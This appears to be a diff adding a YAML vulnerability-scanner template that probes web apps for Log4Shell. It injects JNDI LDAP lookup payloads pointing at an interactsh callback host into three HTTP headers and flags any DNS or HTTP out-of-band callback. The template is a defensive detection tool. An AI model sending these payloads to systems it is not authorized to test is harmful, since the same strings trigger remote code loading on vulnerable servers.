@@ -1,0 +1,24 @@
+id: log4shell-detect
+
+info:
+  name: Detect Log4Shell Vulnerable Web Apps
+  author: bin3xish477
+  severity: high
+  description: This scripts inject JNDI payloads into several HTTP headers and attempts to detect OOB interactions with interactsh
+  tags: log4j,cve,rce
+
+requests:
+  - method: GET
+    path:
+      - "/"
+    headers:
+      User-Agent: "${jndi:ldap://{{interactsh-url}}}"
+      Server-IP: "${jndi:ldap://{{interactsh-url}}}"
+      X-Forwarding: "${jndi:ldap://{{interactsh-url}}}"
+    matchers:
+      type: word
+      part: interactsh_protocol
+      words:
+        - "dns"
+        - "http"
+
